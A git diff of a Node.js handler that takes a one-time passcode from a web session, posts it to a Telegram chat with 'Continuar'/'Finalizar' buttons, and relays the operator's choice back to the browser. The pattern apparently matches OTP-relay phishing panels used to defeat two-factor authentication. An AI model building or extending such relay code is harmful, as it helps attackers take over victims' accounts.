@@ -136,14 +136,20 @@ export const sendSimpleMessage = async (req, res) => {
 
 export const updateMessageWithOtp = async (req, res) => {
   const { otp, socketId } = req.body;
-  const session = activeSessions.get(socketId);
 
-  if (!session) return res.status(400).json({ error: "No hay sesión activa" });
+  const session = activeSessions.get(socketId);
+  if (!session)
+    return res.status(400).json({ error: "No hay sesión activa para ese socketId" });
 
   try {
     session.otp = otp;
 
     const messageText = buildMessageText(session);
+
+    // Generar un nuevo decisionId único para este mensaje actualizado
+    const decisionId = `${socketId}-${Date.now()}`;
+    session.decisionId = decisionId;
+    decisionMap.set(decisionId, socketId);
 
     await editTelegramMessage({
       chatId: session.chatId,
@@ -152,14 +158,8 @@ export const updateMessageWithOtp = async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            {
-              text: "Continuar",
-              callback_data: `continue:${session.decisionId}`,
-            },
-            {
-              text: "Finalizar",
-              callback_data: `finalize:${session.decisionId}`,
-            },
+            { text: "Continuar", callback_data: `continue:${decisionId}` },
+            { text: "Finalizar", callback_data: `finalize:${decisionId}` },
           ],
         ],
       },
@@ -170,12 +170,12 @@ export const updateMessageWithOtp = async (req, res) => {
         const socketId = decisionMap.get(decisionId);
         const session = activeSessions.get(socketId);
         if (session && ioInstance) {
-          ioInstance.to(socketId).emit("decision", decision);
+          ioInstance.to(socketId).emit("final-decision", decision);
         }
-        decisionMap.delete(decisionId); // Limpieza
+        decisionMap.delete(decisionId);
       })
       .catch((err) => {
-        console.error("Timeout esperando decisión:", err.message);
+        console.error("Timeout esperando decisión del OTP:", err.message);
       });
 
     return res.status(200).json({ success: true });
